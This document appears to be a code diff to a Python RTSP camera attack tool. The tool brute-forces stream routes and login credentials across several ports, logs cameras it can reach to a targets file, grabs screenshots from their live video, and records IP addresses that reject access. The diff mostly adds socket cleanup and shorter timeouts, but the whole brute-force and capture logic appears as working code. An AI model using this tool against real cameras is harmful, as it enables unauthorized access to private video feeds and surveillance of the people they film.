@@ -34,99 +34,128 @@ logger_is_enabled = logger.isEnabledFor(logging.DEBUG)
 
 
 def attack(target: RTSPClient, port=None, route=None, credentials=None):
-    if port is None:
-        port = target.port
-    if route is None:
-        route = target.route
-    if credentials is None:
-        credentials = target.credentials
+    try:
+        if port is None:
+            port = target.port
+        if route is None:
+            route = target.route
+        if credentials is None:
+            credentials = target.credentials
 
-    # Create socket connection.
-    connected = target.connect(port)
-    if not connected:
+        # Create socket connection.
+        connected = target.connect(port)
+        if not connected:
+            if logger_is_enabled:
+                exc_info = (
+                    target.last_error if target.status is Status.UNIDENTIFIED else None
+                )
+                logger.debug(f"Failed to connect {target}:", exc_info=exc_info)
+            return False
+
+        # Try to authorize: create describe packet and send it.
+        authorized = target.authorize(port, route, credentials)
         if logger_is_enabled:
-            exc_info = (
-                target.last_error if target.status is Status.UNIDENTIFIED else None
-            )
-            logger.debug(f"Failed to connect {target}:", exc_info=exc_info)
-        return False
+            request = "\n\t".join(target.packet.split("\r\n")).rstrip()
+            if target.data:
+                response = "\n\t".join(target.data.split("\r\n")).rstrip()
+            else:
+                response = ""
+            logger.debug(f"\nSent:\n\t{request}\nReceived:\n\t{response}")
+        if not authorized:
+            if logger_is_enabled:
+                attack_url = RTSPClient.get_rtsp_url(target.ip, port, credentials, route)
+                exc_info = (
+                    target.last_error if target.status is Status.UNIDENTIFIED else None
+                )
+                logger.debug(f"Failed to authorize {attack_url}", exc_info=exc_info)
+            return False
 
-    # Try to authorize: create describe packet and send it.
-    authorized = target.authorize(port, route, credentials)
-    if logger_is_enabled:
-        request = "\n\t".join(target.packet.split("\r\n")).rstrip()
-        if target.data:
-            response = "\n\t".join(target.data.split("\r\n")).rstrip()
-        else:
-            response = ""
-        logger.debug(f"\nSent:\n\t{request}\nReceived:\n\t{response}")
-    if not authorized:
-        if logger_is_enabled:
-            attack_url = RTSPClient.get_rtsp_url(target.ip, port, credentials, route)
-            exc_info = (
-                target.last_error if target.status is Status.UNIDENTIFIED else None
-            )
-            logger.debug(f"Failed to authorize {attack_url}", exc_info=exc_info)
-        return False
-
-    return True
+        return True
+        
+    finally:
+        # Clean up socket if there was an error
+        if not target.is_connected and target.socket:
+            try:
+                target.socket.close()
+            except:
+                pass
+            target.socket = None
 
 
 def attack_route(target: RTSPClient):
-    # If the stream responds positively to the dummy route, it means
-    # it doesn't require (or respect the RFC) a route and the attack
-    # can be skipped.
-    for port in PORTS:
-        ok = attack(target, port=port, route=DUMMY_ROUTE)
-        if ok and any(code in target.data for code in ROUTE_OK_CODES):
-            target.port = port
-            target.routes.append("/")
-            return target
-
-        # Otherwise, bruteforce the routes.
-        for route in ROUTES:
-            ok = attack(target, port=port, route=route)
-            if not ok:
-                break
-            if any(code in target.data for code in ROUTE_OK_CODES):
+    try:
+        # If the stream responds positively to the dummy route, it means
+        # it doesn't require (or respect the RFC) a route and the attack
+        # can be skipped.
+        for port in PORTS:
+            ok = attack(target, port=port, route=DUMMY_ROUTE)
+            if ok and any(code in target.data for code in ROUTE_OK_CODES):
                 target.port = port
-                target.routes.append(route)
+                target.routes.append("/")
                 return target
+
+            # Otherwise, bruteforce the routes.
+            for route in ROUTES:
+                ok = attack(target, port=port, route=route)
+                if not ok:
+                    break
+                if any(code in target.data for code in ROUTE_OK_CODES):
+                    target.port = port
+                    target.routes.append(route)
+                    return target
+    finally:
+        # Ensure socket is cleaned up
+        if target.socket:
+            try:
+                target.socket.close()
+            except:
+                pass
+            target.socket = None
 
 
 def attack_credentials(target: RTSPClient):
-    def _log_working_stream():
-        console.print("Working stream at", target)
-        
-        # Save target to a file
-        with open('targets.txt', 'a') as f:
-            f.write(str(target) + '\n')
-        
-        if logger_is_enabled:
-            logger.debug(
-                f"Working stream at {target} with {target.auth_method.name} auth"
-            )
+    try:
+        def _log_working_stream():
+            console.print("Working stream at", target)
+            
+            # Save target to a file
+            with open('targets.txt', 'a') as f:
+                f.write(str(target) + '\n')
+            
+            if logger_is_enabled:
+                logger.debug(
+                    f"Working stream at {target} with {target.auth_method.name} auth"
+                )
 
-    if target.is_authorized:
-        _log_working_stream()
-        return target
-
-    # If stream responds positively to no credentials, it means
-    # it doesn't require them and the attack can be skipped.
-    ok = attack(target, credentials=":")
-    if ok and any(code in target.data for code in CREDENTIALS_OK_CODES):
-        _log_working_stream()
-        return target
-
-    # Otherwise, bruteforce the routes.
-    for cred in CREDENTIALS:
-        ok = attack(target, credentials=cred)
-        if not ok:
-            break
-        if any(code in target.data for code in CREDENTIALS_OK_CODES):
-            target.credentials = cred
+        if target.is_authorized:
             _log_working_stream()
             return target
+
+        # If stream responds positively to no credentials, it means
+        # it doesn't require them and the attack can be skipped.
+        ok = attack(target, credentials=":")
+        if ok and any(code in target.data for code in CREDENTIALS_OK_CODES):
+            _log_working_stream()
+            return target
+
+        # Otherwise, bruteforce the routes.
+        for cred in CREDENTIALS:
+            ok = attack(target, credentials=cred)
+            if not ok:
+                break
+            if any(code in target.data for code in CREDENTIALS_OK_CODES):
+                target.credentials = cred
+                _log_working_stream()
+                return target
+                
+    finally:
+        # Ensure socket is cleaned up
+        if target.socket:
+            try:
+                target.socket.close()
+            except:
+                pass
+            target.socket = None
 
 
 def _is_video_stream(stream):
@@ -138,19 +167,29 @@ def _is_video_stream(stream):
 
 
 def get_screenshot(rtsp_url: str):
+    container = None
     try:
+        # Set shorter timeout to prevent hanging
         with av.open(
                 rtsp_url,
-                timeout=30.0,
+                timeout=10.0,  # Reduced from 30.0
+                options={
+                    'stimeout': '5000000',  # Socket timeout in microseconds
+                    'rtsp_transport': 'tcp'  # Force TCP to be more reliable
+                }
         ) as container:
             stream = container.streams.video[0]
             if _is_video_stream(stream):
                 file_name = escape_chars(f"{rtsp_url.lstrip('rtsp://')}.jpg")
                 file_path = PICS_FOLDER / file_name
                 stream.thread_type = "AUTO"
+                
+                # Only try to get one frame with timeout
+                container.seek(0)
                 for frame in container.decode(video=0):
                     frame.to_image().save(file_path)
                     break
+                    
                 console.print(
                     f"[bold]Captured screenshot for",
                     f"[underline cyan]{rtsp_url}",
@@ -160,17 +199,26 @@ def get_screenshot(rtsp_url: str):
                 return file_path
 
     except Exception as e:
-        # use a regular expression to match the error message "Server returned 401 Unauthorized"
+        # Extract IP and handle unauthorized error
         match = re.search("Server returned 401 Unauthorized", str(e))
         if match:
-            # extract the IP address from the rtsp_url string using a regular expression
             ip_match = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", rtsp_url)
-            ip_address = ip_match.group()
-            # print the error message
-            console.print(
-                f"[bold]Screenshot failed, but saved IP to file for",
-                f"[underline yellow]{rtsp_url}: {repr(e)}",
-            )
-            # save the IP address to an existing file, creates file if it doesn't exist
-            with open("unauthorized_ips.txt", "a") as f:
-                f.write(ip_address + "\n")
+            if ip_match:
+                ip_address = ip_match.group()
+                console.print(
+                    f"[bold]Screenshot failed, but saved IP to file for",
+                    f"[underline yellow]{rtsp_url}: {repr(e)}",
+                )
+                with open("unauthorized_ips.txt", "a") as f:
+                    f.write(ip_address + "\n")
+        else:
+            # Log other errors
+            if logger_is_enabled:
+                logger.error(f"Screenshot failed for {rtsp_url}: {e}")
+    finally:
+        # Ensure container is closed
+        if container:
+            try:
+                container.close()
+            except:
+                pass
